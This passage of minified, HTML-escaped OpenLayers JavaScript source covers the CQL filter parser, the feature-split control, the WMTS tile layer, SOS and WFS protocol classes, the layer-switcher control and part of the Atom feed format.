b=/^(POINT|LINESTRING|POLYGON|MULTIPOINT|MULTILINESTRING|MULTIPOLYGON|GEOMETRYCOLLECTION)/.exec(a);if(b)&#123;var c=a.length,b=a.indexOf("(",b[0].length);if(-1&lt;b)for(var d=1;b&lt;c&amp;&amp;0&lt;d;)switch(b++,a.charAt(b))&#123;case "(":d++;break;case ")":d--&#125;return[a.substr(0,b+1)]&#125;&#125;,END:/^$/&#125;,c=&#123;LPAREN:["GEOMETRY","SPATIAL","PROPERTY","VALUE","LPAREN"],RPAREN:["NOT","LOGICAL","END","RPAREN"],PROPERTY:["COMPARISON","BETWEEN","COMMA","IS_NULL"],BETWEEN:["VALUE"],IS_NULL:["END"],COMPARISON:["VALUE"],COMMA:["GEOMETRY","VALUE","PROPERTY"],VALUE:["LOGICAL","COMMA","RPAREN","END"],SPATIAL:["LPAREN"],LOGICAL:["NOT","VALUE","SPATIAL","PROPERTY","LPAREN"],NOT:["PROPERTY","LPAREN"],GEOMETRY:["COMMA","RPAREN"]&#125;,d=&#123;"=":OpenLayers.Filter.Comparison.EQUAL_TO,"&lt;&gt;":OpenLayers.Filter.Comparison.NOT_EQUAL_TO,"&lt;":OpenLayers.Filter.Comparison.LESS_THAN,"&lt;=":OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO,"&gt;":OpenLayers.Filter.Comparison.GREATER_THAN,"&gt;=":OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO,LIKE:OpenLayers.Filter.Comparison.LIKE,BETWEEN:OpenLayers.Filter.Comparison.BETWEEN,"IS NULL":OpenLayers.Filter.Comparison.IS_NULL&#125;,e=&#123;&#125;,f=&#123;AND:OpenLayers.Filter.Logical.AND,OR:OpenLayers.Filter.Logical.OR&#125;,g=&#123;&#125;,h=&#123;RPAREN:3,LOGICAL:2,COMPARISON:1&#125;,k;for(k in d)d.hasOwnProperty(k)&amp;&amp;(e[d[k]]=k);for(k in f)f.hasOwnProperty(k)&amp;&amp;(g[f[k]]=k);return OpenLayers.Class(OpenLayers.Format,&#123;read:function(d)&#123;var e=d;d=[];var f,g=["NOT","GEOMETRY","SPATIAL","PROPERTY","LPAREN"];do&#123;a:&#123;f=g;for(var h=void 0,g=void 0,k=f.length,h=0;h&lt;k;h++)&#123;var g=f[h],s=b[g]instanceof RegExp?b[g].exec(e):(0,b[g])(e);if(s)&#123;f=s[0];e=e.substr(f.length).replace(/^\s*/,"");f=&#123;type:g,text:f,remainder:e&#125;;break a&#125;&#125;d="ERROR: In parsing: ["+e+"], expected one of: ";for(h=0;h&lt;k;h++)g=f[h],d+="\n "+g+": "+b[g];throw Error(d);&#125;e=f.remainder;g=c[f.type];if("END"!=f.type&amp;&amp;!g)throw Error("No follows list for "+f.type);d.push(f)&#125;while("END"!=f.type);d=a(d);this.keepData&amp;&amp;(this.data=d);return d&#125;,write:function(a)&#123;if(a instanceof OpenLayers.Geometry)return a.toString();switch(a.CLASS_NAME)&#123;case "OpenLayers.Filter.Spatial":switch(a.type)&#123;case OpenLayers.Filter.Spatial.BBOX:return"BBOX("+a.property+","+a.value.toBBOX()+")";case OpenLayers.Filter.Spatial.DWITHIN:return"DWITHIN("+a.property+", "+this.write(a.value)+", "+a.distance+")";case OpenLayers.Filter.Spatial.WITHIN:return"WITHIN("+a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.INTERSECTS:return"INTERSECTS("+a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.CONTAINS:return"CONTAINS("+a.property+", "+this.write(a.value)+")";default:throw Error("Unknown spatial filter type: "+a.type);&#125;case "OpenLayers.Filter.Logical":if(a.type==OpenLayers.Filter.Logical.NOT)return"NOT ("+this.write(a.filters[0])+")";for(var b="(",c=!0,d=0;d&lt;a.filters.length;d++)c?c=!1:b+=") "+g[a.type]+" (",b+=this.write(a.filters[d]);return b+")";case "OpenLayers.Filter.Comparison":return a.type==OpenLayers.Filter.Comparison.BETWEEN?a.property+" BETWEEN "+this.write(a.lowerBoundary)+" AND "+this.write(a.upperBoundary):null!==a.value?a.property+" "+e[a.type]+" "+this.write(a.value):a.property+" "+e[a.type];case void 0:if("string"===typeof a)return"'"+a.replace(/'/g,"''")+"'";if("number"===typeof a)return String(a);default:throw Error("Can't encode: "+a.CLASS_NAME+" "+a);&#125;&#125;,CLASS_NAME:"OpenLayers.Format.CQL"&#125;)&#125;();OpenLayers.Control.Split=OpenLayers.Class(OpenLayers.Control,&#123;layer:null,source:null,sourceOptions:null,tolerance:null,edge:!0,deferDelete:!1,mutual:!0,targetFilter:null,sourceFilter:null,handler:null,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||&#123;&#125;;this.options.source&amp;&amp;this.setSource(this.options.source)&#125;,setSource:function(a)&#123;this.active?(this.deactivate(),this.handler&amp;&amp;(this.handler.destroy(),delete this.handler),this.source=a,this.activate()):this.source=a&#125;,activate:function()&#123;var a=OpenLayers.Control.prototype.activate.call(this);if(a)if(!this.source)this.handler||(this.handler=new OpenLayers.Handler.Path(this,&#123;done:function(a)&#123;this.onSketchComplete(&#123;feature:new OpenLayers.Feature.Vector(a)&#125;)&#125;&#125;,&#123;layerOptions:this.sourceOptions&#125;)),this.handler.activate();else if(this.source.events)this.source.events.on(&#123;sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Control.prototype.deactivate.call(this);a&amp;&amp;this.source&amp;&amp;this.source.events&amp;&amp;this.source.events.un(&#123;sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this&#125;);return a&#125;,onSketchComplete:function(a)&#123;this.feature=null;return!this.considerSplit(a.feature)&#125;,afterFeatureModified:function(a)&#123;a.modified&amp;&amp;"function"===typeof a.feature.geometry.split&amp;&amp;(this.feature=a.feature,this.considerSplit(a.feature))&#125;,removeByGeometry:function(a,b)&#123;for(var c=0,d=a.length;c&lt;d;++c)if(a[c].geometry===b)&#123;a.splice(c,1);break&#125;&#125;,isEligible:function(a)&#123;return a.geometry?a.state!==OpenLayers.State.DELETE&amp;&amp;"function"===typeof a.geometry.split&amp;&amp;this.feature!==a&amp;&amp;(!this.targetFilter||this.targetFilter.evaluate(a.attributes)):!1&#125;,considerSplit:function(a)&#123;var b=!1,c=!1;if(!this.sourceFilter||this.sourceFilter.evaluate(a.attributes))&#123;for(var d=this.layer&amp;&amp;this.layer.features||[],e,f,g=[],h=[],k=this.layer===this.source&amp;&amp;this.mutual,l=&#123;edge:this.edge,tolerance:this.tolerance,mutual:k&#125;,m=[a.geometry],n,p,q,r=0,s=d.length;r&lt;s;++r)if(n=d[r],this.isEligible(n))&#123;p=[n.geometry];for(var t=0;t&lt;m.length;++t)&#123;q=m[t];for(var u=0;u&lt;p.length;++u)if(e=p[u],q.getBounds().intersectsBounds(e.getBounds())&amp;&amp;(e=q.split(e,l)))f=this.events.triggerEvent("beforesplit",&#123;source:a,target:n&#125;),!1!==f&amp;&amp;(k&amp;&amp;(f=e[0],1&lt;f.length&amp;&amp;(f.unshift(t,1),Array.prototype.splice.apply(m,f),t+=f.length-3),e=e[1]),1&lt;e.length&amp;&amp;(e.unshift(u,1),Array.prototype.splice.apply(p,e),u+=e.length-3))&#125;p&amp;&amp;1&lt;p.length&amp;&amp;(this.geomsToFeatures(n,p),this.events.triggerEvent("split",&#123;original:n,features:p&#125;),Array.prototype.push.apply(g,p),h.push(n),c=!0)&#125;m&amp;&amp;1&lt;m.length&amp;&amp;(this.geomsToFeatures(a,m),this.events.triggerEvent("split",&#123;original:a,features:m&#125;),Array.prototype.push.apply(g,m),h.push(a),b=!0);if(b||c)&#123;if(this.deferDelete)&#123;d=[];r=0;for(s=h.length;r&lt;s;++r)c=h[r],c.state===OpenLayers.State.INSERT?d.push(c):(c.state=OpenLayers.State.DELETE,this.layer.drawFeature(c));this.layer.destroyFeatures(d,&#123;silent:!0&#125;);r=0;for(s=g.length;r&lt;s;++r)g[r].state=OpenLayers.State.INSERT&#125;else this.layer.destroyFeatures(h,&#123;silent:!0&#125;);this.layer.addFeatures(g,&#123;silent:!0&#125;);this.events.triggerEvent("aftersplit",&#123;source:a,features:g&#125;)&#125;&#125;return b&#125;,geomsToFeatures:function(a,b)&#123;var c=a.clone();delete c.geometry;for(var d,e=0,f=b.length;e&lt;f;++e)d=c.clone(),d.geometry=b[e],d.state=OpenLayers.State.INSERT,b[e]=d&#125;,destroy:function()&#123;this.active&amp;&amp;this.deactivate();OpenLayers.Control.prototype.destroy.call(this)&#125;,CLASS_NAME:"OpenLayers.Control.Split"&#125;);OpenLayers.Layer.WMTS=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;isBaseLayer:!0,version:"1.0.0",requestEncoding:"KVP",url:null,layer:null,matrixSet:null,style:null,format:"image/jpeg",tileOrigin:null,tileFullExtent:null,formatSuffix:null,matrixIds:null,dimensions:null,params:null,zoomOffset:0,serverResolutions:null,formatSuffixMap:&#123;"image/png":"png","image/png8":"png","image/png24":"png","image/png32":"png",png:"png","image/jpeg":"jpg","image/jpg":"jpg",jpeg:"jpg",jpg:"jpg"&#125;,matrix:null,initialize:function(a)&#123;var b=&#123;url:!0,layer:!0,style:!0,matrixSet:!0&#125;,c;for(c in b)if(!(c in a))throw Error("Missing property '"+c+"' in layer configuration.");a.params=OpenLayers.Util.upperCaseObject(a.params);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,a.params,a]);this.formatSuffix||(this.formatSuffix=this.formatSuffixMap[this.format]||this.format.split("/").pop());if(this.matrixIds&amp;&amp;(a=this.matrixIds.length)&amp;&amp;"string"===typeof this.matrixIds[0])for(b=this.matrixIds,this.matrixIds=Array(a),c=0;c&lt;a;++c)this.matrixIds[c]=&#123;identifier:b[c]&#125;&#125;,setMap:function()&#123;OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments)&#125;,updateMatrixProperties:function()&#123;if(this.matrix=this.getMatrix())this.matrix.topLeftCorner&amp;&amp;(this.tileOrigin=this.matrix.topLeftCorner),this.matrix.tileWidth&amp;&amp;this.matrix.tileHeight&amp;&amp;(this.tileSize=new OpenLayers.Size(this.matrix.tileWidth,this.matrix.tileHeight)),this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.top)),this.tileFullExtent||(this.tileFullExtent=this.maxExtent)&#125;,moveTo:function(a,b,c)&#123;!b&amp;&amp;this.matrix||this.updateMatrixProperties();return OpenLayers.Layer.Grid.prototype.moveTo.apply(this,arguments)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.WMTS(this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getIdentifier:function()&#123;return this.getServerZoom()&#125;,getMatrix:function()&#123;var a;if(this.matrixIds&amp;&amp;0!==this.matrixIds.length)if("scaleDenominator"in this.matrixIds[0])for(var b=OpenLayers.METERS_PER_INCH*OpenLayers.INCHES_PER_UNIT[this.units]*this.getServerResolution()/2.8E-4,c=Number.POSITIVE_INFINITY,d,e=0,f=this.matrixIds.length;e&lt;f;++e)d=Math.abs(1-this.matrixIds[e].scaleDenominator/b),d&lt;c&amp;&amp;(c=d,a=this.matrixIds[e]);else a=this.matrixIds[this.getIdentifier()];else a=&#123;identifier:this.getIdentifier()&#125;;return a&#125;,getTileInfo:function(a)&#123;var b=this.getServerResolution(),c=(a.lon-this.tileOrigin.lon)/(b*this.tileSize.w);a=(this.tileOrigin.lat-a.lat)/(b*this.tileSize.h);var b=Math.floor(c),d=Math.floor(a);return&#123;col:b,row:d,i:Math.floor((c-b)*this.tileSize.w),j:Math.floor((a-d)*this.tileSize.h)&#125;&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b="";if(!this.tileFullExtent||this.tileFullExtent.intersectsBounds(a))&#123;a=a.getCenterLonLat();var c=this.getTileInfo(a);a=this.dimensions;var d,b=OpenLayers.Util.isArray(this.url)?this.selectUrl([this.version,this.style,this.matrixSet,this.matrix.identifier,c.row,c.col].join(),this.url):this.url;if("REST"===this.requestEncoding.toUpperCase())if(d=this.params,-1!==b.indexOf("&#123;"))&#123;b=b.replace(/\&#123;/g,"$&#123;");c=&#123;style:this.style,Style:this.style,TileMatrixSet:this.matrixSet,TileMatrix:this.matrix.identifier,TileRow:c.row,TileCol:c.col&#125;;if(a)&#123;var e,f;for(f=a.length-1;0&lt;=f;--f)e=a[f],c[e]=d[e.toUpperCase()]&#125;b=OpenLayers.String.format(b,c)&#125;else&#123;e=this.version+"/"+this.layer+"/"+this.style+"/";if(a)for(f=0;f&lt;a.length;f++)d[a[f]]&amp;&amp;(e=e+d[a[f]]+"/");e=e+this.matrixSet+"/"+this.matrix.identifier+"/"+c.row+"/"+c.col+"."+this.formatSuffix;b.match(/\/$/)||(b+="/");b+=e&#125;else"KVP"===this.requestEncoding.toUpperCase()&amp;&amp;(d=&#123;SERVICE:"WMTS",REQUEST:"GetTile",VERSION:this.version,LAYER:this.layer,STYLE:this.style,TILEMATRIXSET:this.matrixSet,TILEMATRIX:this.matrix.identifier,TILEROW:c.row,TILECOL:c.col,FORMAT:this.format&#125;,b=OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,[d]))&#125;return b&#125;,mergeNewParams:function(a)&#123;if("KVP"===this.requestEncoding.toUpperCase())return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,[OpenLayers.Util.upperCaseObject(a)])&#125;,CLASS_NAME:"OpenLayers.Layer.WMTS"&#125;);OpenLayers.Protocol.SOS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol,&#123;fois:null,formatOptions:null,initialize:function(a)&#123;OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.SOSGetFeatureOfInterest(this.formatOptions))&#125;,destroy:function()&#123;this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)&#125;,read:function(a)&#123;a=OpenLayers.Util.extend(&#123;&#125;,a);OpenLayers.Util.applyDefaults(a,this.options||&#123;&#125;);var b=new OpenLayers.Protocol.Response(&#123;requestType:"read"&#125;),c=this.format,c=OpenLayers.Format.XML.prototype.write.apply(c,[c.writeNode("sos:GetFeatureOfInterest",&#123;fois:this.fois&#125;)]);b.priv=OpenLayers.Request.POST(&#123;url:a.url,callback:this.createCallback(this.handleRead,b,a),data:c&#125;);return b&#125;,handleRead:function(a,b)&#123;if(b.callback)&#123;var c=a.priv;200&lt;=c.status&amp;&amp;300&gt;c.status?(a.features=this.parseFeatures(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)&#125;&#125;,parseFeatures:function(a)&#123;var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0&gt;=b.length?null:this.format.read(b)&#125;,CLASS_NAME:"OpenLayers.Protocol.SOS.v1_0_0"&#125;);OpenLayers.Layer.KaMapCache=OpenLayers.Class(OpenLayers.Layer.KaMap,&#123;IMAGE_EXTENSIONS:&#123;jpeg:"jpg",gif:"gif",png:"png",png8:"png",png24:"png",dithered:"png"&#125;,DEFAULT_FORMAT:"jpeg",initialize:function(a,b,c,d)&#123;OpenLayers.Layer.KaMap.prototype.initialize.apply(this,arguments);this.extension=this.IMAGE_EXTENSIONS[this.params.i.toLowerCase()||this.DEFAULT_FORMAT]&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a=-Math.round(a.top/b);var b=Math.floor(d/this.tileSize.w/this.params.metaTileSize.w)*this.tileSize.w*this.params.metaTileSize.w,e=Math.floor(a/this.tileSize.h/this.params.metaTileSize.h)*this.tileSize.h*this.params.metaTileSize.h,c=["/",this.params.map,"/",c,"/",this.params.g.replace(/\s/g,"_"),"/def/t",e,"/l",b,"/t",a,"l",d,".",this.extension],d=this.url;OpenLayers.Util.isArray(d)&amp;&amp;(d=this.selectUrl(c.join(""),d));return d+c.join("")&#125;,CLASS_NAME:"OpenLayers.Layer.KaMapCache"&#125;);OpenLayers.Protocol.WFS.v1_1_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,&#123;version:"1.1.0",initialize:function(a)&#123;OpenLayers.Protocol.WFS.v1.prototype.initialize.apply(this,arguments);this.outputFormat&amp;&amp;!this.readFormat&amp;&amp;("gml2"==this.outputFormat.toLowerCase()?this.readFormat=new OpenLayers.Format.GML.v2(&#123;featureType:this.featureType,featureNS:this.featureNS,geometryName:this.geometryName&#125;):"json"==this.outputFormat.toLowerCase()&amp;&amp;(this.readFormat=new OpenLayers.Format.GeoJSON))&#125;,CLASS_NAME:"OpenLayers.Protocol.WFS.v1_1_0"&#125;);OpenLayers.Format.WMSCapabilities.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,&#123;version:"1.1.1",readers:&#123;wms:OpenLayers.Util.applyDefaults(&#123;SRS:function(a,b)&#123;b.srs[this.getChildValue(a)]=!0&#125;&#125;,OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1"&#125;);OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1_1,&#123;version:"1.1.1",profile:"WMSC",readers:&#123;wms:OpenLayers.Util.applyDefaults(&#123;VendorSpecificCapabilities:function(a,b)&#123;b.vendorSpecific=&#123;tileSets:[]&#125;;this.readChildNodes(a,b.vendorSpecific)&#125;,TileSet:function(a,b)&#123;var c=&#123;srs:&#123;&#125;,bbox:&#123;&#125;,resolutions:[]&#125;;this.readChildNodes(a,c);b.tileSets.push(c)&#125;,Resolutions:function(a,b)&#123;for(var c=this.getChildValue(a).split(" "),d=0,e=c.length;d&lt;e;d++)""!=c[d]&amp;&amp;b.resolutions.push(parseFloat(c[d]))&#125;,Width:function(a,b)&#123;b.width=parseInt(this.getChildValue(a))&#125;,Height:function(a,b)&#123;b.height=parseInt(this.getChildValue(a))&#125;,Layers:function(a,b)&#123;b.layers=this.getChildValue(a)&#125;,Styles:function(a,b)&#123;b.styles=this.getChildValue(a)&#125;&#125;,OpenLayers.Format.WMSCapabilities.v1_1_1.prototype.readers.wms)&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC"&#125;);OpenLayers.Control.LayerSwitcher=OpenLayers.Class(OpenLayers.Control,&#123;layerStates:null,layersDiv:null,baseLayersDiv:null,baseLayers:null,dataLbl:null,dataLayersDiv:null,dataLayers:null,minimizeDiv:null,maximizeDiv:null,ascending:!0,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,arguments);this.layerStates=[]&#125;,destroy:function()&#123;this.clearLayersArray("base");this.clearLayersArray("data");this.map.events.un(&#123;buttonclick:this.onButtonClick,addlayer:this.redraw,changelayer:this.redraw,removelayer:this.redraw,changebaselayer:this.redraw,scope:this&#125;);this.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,setMap:function(a)&#123;OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.on(&#123;addlayer:this.redraw,changelayer:this.redraw,removelayer:this.redraw,changebaselayer:this.redraw,scope:this&#125;);this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)):this.map.events.register("buttonclick",this,this.onButtonClick)&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this);this.loadContents();this.outsideViewport||this.minimizeControl();this.redraw();return this.div&#125;,onButtonClick:function(a)&#123;a=a.buttonElement;a===this.minimizeDiv?this.minimizeControl():a===this.maximizeDiv?this.maximizeControl():a._layerSwitcher===this.id&amp;&amp;(a["for"]&amp;&amp;(a=document.getElementById(a["for"])),a.disabled||("radio"==a.type?(a.checked=!0,this.map.setBaseLayer(this.map.getLayer(a._layer))):(a.checked=!a.checked,this.updateMap())))&#125;,clearLayersArray:function(a)&#123;this[a+"LayersDiv"].innerHTML="";this[a+"Layers"]=[]&#125;,checkRedraw:function()&#123;if(!this.layerStates.length||this.map.layers.length!=this.layerStates.length)return!0;for(var a=0,b=this.layerStates.length;a&lt;b;a++)&#123;var c=this.layerStates[a],d=this.map.layers[a];if(c.name!=d.name||c.inRange!=d.inRange||c.id!=d.id||c.visibility!=d.visibility)return!0&#125;return!1&#125;,redraw:function()&#123;if(!this.checkRedraw())return this.div;this.clearLayersArray("base");this.clearLayersArray("data");var a=!1,b=!1,c=this.map.layers.length;this.layerStates=Array(c);for(var d=0;d&lt;c;d++)&#123;var e=this.map.layers[d];this.layerStates[d]=&#123;name:e.name,visibility:e.visibility,inRange:e.inRange,id:e.id&#125;&#125;var f=this.map.layers.slice();this.ascending||f.reverse();d=0;for(c=f.length;d&lt;c;d++)&#123;var e=f[d],g=e.isBaseLayer;if(e.displayInLayerSwitcher)&#123;g?b=!0:a=!0;var h=g?e==this.map.baseLayer:e.getVisibility(),k=document.createElement("input"),l=OpenLayers.Util.createUniqueID(this.id+"_input_");k.id=l;k.name=g?this.id+"_baseLayers":e.name;k.type=g?"radio":"checkbox";k.value=e.name;k.checked=h;k.defaultChecked=h;k.className="olButton";k._layer=e.id;k._layerSwitcher=this.id;g||e.inRange||(k.disabled=!0);h=document.createElement("label");h["for"]=k.id;OpenLayers.Element.addClass(h,"labelSpan olButton");h._layer=e.id;h._layerSwitcher=this.id;g||e.inRange||(h.style.color="gray");h.innerHTML=e.name;h.style.verticalAlign=g?"bottom":"baseline";l=document.createElement("br");(g?this.baseLayers:this.dataLayers).push(&#123;layer:e,inputElem:k,labelSpan:h&#125;);e=g?this.baseLayersDiv:this.dataLayersDiv;e.appendChild(k);e.appendChild(h);e.appendChild(l)&#125;&#125;this.dataLbl.style.display=a?"":"none";this.baseLbl.style.display=b?"":"none";return this.div&#125;,updateMap:function()&#123;for(var a=0,b=this.baseLayers.length;a&lt;b;a++)&#123;var c=this.baseLayers[a];c.inputElem.checked&amp;&amp;this.map.setBaseLayer(c.layer,!1)&#125;a=0;for(b=this.dataLayers.length;a&lt;b;a++)c=this.dataLayers[a],c.layer.setVisibility(c.inputElem.checked)&#125;,maximizeControl:function(a)&#123;this.div.style.width="";this.div.style.height="";this.showControls(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)&#125;,minimizeControl:function(a)&#123;this.div.style.width="0px";this.div.style.height="0px";this.showControls(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)&#125;,showControls:function(a)&#123;this.maximizeDiv.style.display=a?"":"none";this.minimizeDiv.style.display=a?"none":"";this.layersDiv.style.display=a?"none":""&#125;,loadContents:function()&#123;this.layersDiv=document.createElement("div");this.layersDiv.id=this.id+"_layersDiv";OpenLayers.Element.addClass(this.layersDiv,"layersDiv");this.baseLbl=document.createElement("div");this.baseLbl.innerHTML=OpenLayers.i18n("Base Layer");OpenLayers.Element.addClass(this.baseLbl,"baseLbl");this.baseLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.baseLayersDiv,"baseLayersDiv");this.dataLbl=document.createElement("div");this.dataLbl.innerHTML=OpenLayers.i18n("Overlays");OpenLayers.Element.addClass(this.dataLbl,"dataLbl");this.dataLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.dataLayersDiv,"dataLayersDiv");this.ascending?(this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv),this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv)):(this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv),this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv));this.div.appendChild(this.layersDiv);var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MaximizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.maximizeDiv,"maximizeDiv olButton");this.maximizeDiv.style.display="none";this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MinimizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.minimizeDiv,"minimizeDiv olButton");this.minimizeDiv.style.display="none";this.div.appendChild(this.minimizeDiv)&#125;,CLASS_NAME:"OpenLayers.Control.LayerSwitcher"&#125;);OpenLayers.Format.Atom=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;atom:"http://www.w3.org/2005/Atom",georss:"http://www.georss.org/georss"&#125;,feedTitle:"untitled",defaultEntryTitle:"untitled",gmlParser:null,xy:!1,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));return this.parseFeatures(a)&#125;,write:function(a)&#123;var b;if(OpenLayers.Util.isArray(a))&#123;b=this.createElementNSPlus("atom:feed");b.appendChild(this.createElementNSPlus("atom:title",&#123;value:this.feedTitle&#125;));for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.buildEntryNode(a[c]))&#125;else b=this.buildEntryNode(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,buildContentNode:function(a)&#123;var b=this.createElementNSPlus("atom:content",&#123;attributes:&#123;type:a.type||null&#125;&#125;);if(a.src)b.setAttribute("src",a.src);else if("text"==a.type||null==a.type)b.appendChild(this.createTextNode(a.value));else if("html"==a.type)&#123;if("string"!=typeof a.value)throw"HTML content must be in form of an escaped string";b.appendChild(this.createTextNode(a.value))&#125;else"xhtml"==a.type?b.appendChild(a.value):"xhtml"==a.type||a.type.match(/(\+|\/)xml$/)?b.appendChild(a.value):b.appendChild(this.createTextNode(a.value));return b&#125;,buildEntryNode:function(a)&#123;var b=a.attributes,c=b.atom||&#123;&#125;,d=this.createElementNSPlus("atom:entry");if(c.authors)for(var e=OpenLayers.Util.isArray(c.authors)?c.authors:[c.authors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("author",e[f]));if(c.categories)for(var e=OpenLayers.Util.isArray(c.categories)?c.categories:[c.categories],h,f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:category",&#123;attributes:&#123;term:h.term,scheme:h.scheme||null,label:h.label||null&#125;&#125;));c.content&amp;&amp;d.appendChild(this.buildContentNode(c.content));if(c.contributors)for(e=OpenLayers.Util.isArray(c.contributors)?c.contributors:[c.contributors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("contributor",e[f]));a.fid&amp;&amp;d.appendChild(this.createElementNSPlus("atom:id",&#123;value:a.fid&#125;));if(c.links)for(e=OpenLayers.Util.isArray(c.links)?c.links:[c.links],f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:link",&#123;attributes:&#123;href:h.href,rel:h.rel||null,type:h.type||null,hreflang:h.hreflang||null,title:h.title||null,length:h.length||null&#125;&#125;));c.published&amp;&amp;d.appendChild(this.createElementNSPlus("atom:published",&#123;value:c.published&#125;));c.rights&amp;&amp;d.appendChild(this.createElementNSPlus("atom:rights",&#123;value:c.rights&#125;));(c.summary||b.description)&amp;&amp;d.appendChild(this.createElementNSPlus("atom:summary",&#123;value:c.summary||b.description&#125;));d.appendChild(this.createElementNSPlus("atom:title",&#123;value:c.title||b.title||this.defaultEntryTitle&#125;));c.updated&amp;&amp;d.appendChild(this.createElementNSPlus("atom:updated",&#123;value:c.updated&#125;));a.geometry&amp;&amp;(b=this.createElementNSPlus("georss:where"),b.appendChild(this.buildGeometryNode(a.geometry)),d.appendChild(b));return d&#125;,initGmlParser:function()&#123;this.gmlParser=new OpenLayers.Format.GML.v3(&#123;xy:this.xy,featureNS:"http://example.com#feature",internalProjection:this.internalProjection,externalProjection:this.externalProjection&#125;)&#125;,buildGeometryNode:function(a)&#123;this.gmlParser||this.initGmlParser();return this.gmlParser.writeNode("feature:_geometry",a).firstChild&#125;,buildPersonConstructNode:function(a,b)&#123;var c=["uri","email"],d=this.createElementNSPlus("atom:"+a);d.appendChild(this.createElementNSPlus("atom:name",&#123;value:b.name&#125;));for(var e=0,f=c.length;e&lt;f;e++)b[c[e]]&amp;&amp;d.appendChild(this.createElementNSPlus("atom:"+c[e],&#123;value:b[c[e]]&#125;));return d&#125;,getFirstChildValue:function(a,b,c,d)&#123;return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;0&lt;a.length?this.getChildValue(a[0],d):d&#125;,parseFeature:function(a)&#123;var b=&#123;&#125;,c=null,d=null,e=null,f=this.namespaces.atom;this.parsePersonConstructs(a,"author",b);d=this.getElementsByTagNameNS(a,f,"category");0&lt;d.length&amp;&amp;(b.categories=[]);for(var 